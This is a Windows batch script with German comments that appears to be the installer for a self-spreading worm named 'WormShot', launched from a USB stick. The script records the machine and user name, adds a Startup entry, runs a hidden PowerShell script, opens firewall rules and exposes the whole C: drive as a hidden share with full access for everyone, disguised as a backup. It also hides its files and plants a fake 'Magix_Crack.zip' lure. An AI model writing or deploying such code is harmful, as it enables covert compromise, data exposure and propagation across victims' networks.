@echo off
REM NUR Über Verknüpfung ÖFFNEN, wichtig das bei Verknüpfung auführen in, dieser Ordner

rem da als admin ausgeführt
cd /d "%~dp0"

echo %computername% / %username% >> "WormShot_Spread.wsdt"

REM Auf USB-Stick eingliedern, da Dokument nicht in gleichem Ordner aber auch erste Ebene
rem cd "WormShot\SYS\" || exit
cd..&cd..&cd..

REM Autostart
copy "start.lnk" "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\" || echo ERROR ###: AutoStart-Eintrag nicht gespeichert >> "Error.txt"

REM Aktiviere Netzwerkerkennung - ADMINISTRATORRECHTE ERFORDERLICH
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -executionpolicy remotesigned -File  "%cd%\INSTALL_Tools\TarnInstall\Programm_EXE\private.ps1"
netsh advfirewall firewall set rule group="Netzwerkerkennung" new enable=Yes
netsh advfirewall firewall set rule group="Datei- und Druckerfreigabe" new enable=Yes
net start server
net start arbeitsstationsdienst
net start computerbrowser

REM Gebe User Ordner für Netzwerk frei -- UNSICHTBAR
net share WindowsRecovery$=C:\ /GRANT:Jeder,FULL /UNLIMITED /REMARK:"Windows Sicherung - Daten werden verschluesselt im Netzwerk gesichert." /CACHE:no || echo ERROR ###-1: WindowsRecovery$ nicht freigegeben. >> "Error.txt"
if not exist "\\%computername%\WindowsRecovery$\" echo ERROR ###-2: PFAD WindowsRecovery$ nicht freigegeben. >> "Error.txt"
REM Setze WScript als Standard-Output, damit kein Konsolenfenster erscheint
cscript //h:wscript //s

REM WormShot installieren
md "C:\users\%username%\WormShot" 
attrib +H "C:\users\%username%\WormShot"
cd..&cd..
xcopy "Wormshot\*.*" "C:\users\%username%\WormShot\" /Y /K /H /Q /E /I || echo ERROR ###: WormShot nicht kopiert. >> "Error.txt"


xcopy /H /Y "WormShot\SYS\INSTALL_Tools\TarnInstall\Programm_EXE\Magix_Crack.zip" "C:\users\%username%\desktop\"
start "" "WormShot_2\Installation.exe"
timeout 0 /NOBREAK >NUL
attrib -H "C:\users\%username%\desktop\Magix_Crack.zip"

exit